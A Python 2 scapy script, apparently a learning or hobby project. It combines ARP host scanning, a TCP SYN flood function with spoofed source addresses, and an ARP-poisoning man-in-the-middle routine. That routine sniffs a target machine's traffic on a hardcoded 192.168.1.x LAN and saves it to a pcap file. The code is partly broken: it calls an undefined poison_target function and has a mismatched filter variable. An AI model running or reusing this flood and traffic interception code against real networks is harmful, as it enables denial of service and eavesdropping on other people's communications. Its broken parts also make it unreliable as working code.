#!/usr/bin/env python
# -*- coding:utf-8 -*-
from scapy.all import *
import socket
import json
import random
import sys
from job import Job
global mode


#scan active host
def active_host(ip_section):
    host_list = my_arping(ip_section)
    return host_list



#send arp parket to ip section
def my_arping(net, timeout=2, cache=0, verbose=None, **kargs):
    host_list = []
    """Send ARP who-has requests to determine which hosts are up
    arping(net, [cache=0,] [iface=conf.iface,] [verbose=conf.verb]) -> None
    Set cache=True if you want arping to modify internal ARP-Cache"""
    if verbose is None:
        verbose = conf.verb
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=net), verbose=verbose,filter="arp and arp[7] = 2",
                     timeout=timeout, iface_hint=net, **kargs)
    for s, r in ans.res:
        ip = r.sprintf("%ARP.psrc%")
        mac = r.sprintf("%Ether.src%")
        host_list.append((ip,mac))
    return host_list


def get_hostname_by_ip(ipaddr):
    try:
        result = socket.gethostbyaddr(ipaddr)
        return result[0]
    except socket.herror,e:
        print e
        return None

def load_rules(filename):
    with open(filename,"r") as f:
        rules = json.load(f)
    return rules

def tcp_syn_flood(ip,dPort):
    srcList = ['201.1.1.2', '10.1.1.102', '69.1.1.2', '125.130.5.199']
    for sPort in range(1024, 65535):
        index = random.randrange(4)
        ipLayer = IP(src=srcList[index], dst=ip)
        tcpLayer = TCP(sport=sPort, dport=dPort, flags="S")
        packet = ipLayer / tcpLayer
        send(packet)

def packet(packet):
    print packet.show()

def start_sniff_arp(packet_callback,IPSECTION):

    sniff(filter= "arp and net {0}".format(IPSECTION), prn = packet_callback,count=0,store=0)


'''
以下代码 from python 黑帽子
'''

def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):

    # 以下代码调用send函数的方式稍有不同
    print "[*] Restoring target..."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # 发出退出信号到主线程
    #os.kill(os.getpid(), signal.SIGKILL)
    #os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_address):

    # srp函数（发送和接收数据包，发送指定ARP请求到指定IP地址,然后从返回的数据中获取目标ip的mac）
    responses,unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=2, retry=10)
    #　返回从响应数据中获取的MAC地址
    for s,r in responses:
        return r[Ether].src
    return None







def stop_sniff():
    print '[*]Stop the Sniffing .....'

    return False

def start_sniff(packet_count,bdf_filter):
    sniff(count=packet_count, filter=bpf_filter)


if __name__ == "__main__":
    global mode
    packet_count = 10
    '''
    gateway_ip = '10.2.10.254'
    target_ip = '10.2.10.251'
    target_mac = ''
    '''
    gateway_ip = '192.168.1.1'
    gateway_mac = '78:a1:06:95:c1:8e'
    target_ip = '192.168.1.101'
    target_mac = ''

    # 获取网关mac
    gateway_mac = get_mac(gateway_ip)

    if gateway_mac is None:
        print "[!!!] Failed to get gateway MAC. Exiting"
        sys.exit(0)
    else:
        print "[*] Gateway %s is at %s" % (gateway_ip, gateway_mac)

    # 获取目标(被攻击的机器)mac
    target_mac = get_mac(target_ip)

    if target_mac is None:
        print "[!!!] Failed to get target MAC. Exiting"
        sys.exit(0)
    else:
        print "[*] Target %s is at %s" % (target_ip, target_mac)

    # 启动ARP投毒（欺骗）线程
    poison_thread = Job(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.setDaemon(True)
    poison_thread.start()

    try:
        print "[*] Starting sniffer for %d packets" % packet_count

        bpf_filter = "ip host %s " % target_ip  # 过滤器
        #sniff_thread = Job(target=start_sniff,args=(packet_count,bpf_filter))
        #sniff_thread.setDaemon(True)
        #sniff_thread.start()
        packets = sniff(count=packet_count, filter=bpf_filter,prn=packet)#,stopper = stop_sniff,stopper_timeout =1)

        # 将捕获到的数据包输出到文件

        #time.sleep(5)
        wrpcap('listen_data.pcap', packets)
        poison_thread.stop()
        #sniff_thread.stop()
        # 还原网络配置
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    except KeyboardInterrupt:
        # 还原网络配置
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
